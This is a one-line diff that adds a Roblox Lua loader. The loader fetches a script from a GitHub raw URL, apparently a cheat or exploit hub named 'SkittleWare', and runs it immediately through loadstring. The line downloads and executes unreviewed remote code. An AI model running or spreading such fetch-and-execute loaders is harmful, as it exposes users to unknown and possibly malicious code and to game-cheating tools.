@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Bloodlxst/SkittleWare/main/Script.txt", true))()
